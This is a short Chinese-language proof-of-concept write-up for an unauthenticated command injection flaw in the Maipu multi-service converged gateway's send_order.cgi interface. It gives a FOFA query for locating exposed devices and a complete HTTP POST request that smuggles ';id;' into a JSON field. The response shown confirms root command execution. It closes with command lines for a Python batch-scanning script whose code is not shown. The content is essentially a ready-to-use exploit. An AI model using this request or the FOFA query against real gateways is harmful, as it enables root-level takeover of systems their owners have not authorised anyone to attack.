# 迈普多业务融合网关远程命令执行漏洞

### 1.漏洞描述

迈普多业务融合网关 send order.cgi接口处存在命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，从而获取服务器shell权限。

### 2.fofa语法

```plain
title=="迈普多业务融合网关"
```

### 3.漏洞复现

```plain
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 40
Priority: u=1

{"opid":"1","name":";id;","type":"rest"}
```

返回包显示如下：

```plain
HTTP/1.0 200 OK
uid=0(root) gid=0(root)


						
{"type":1,"msg":"ok"}
```

### 4.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```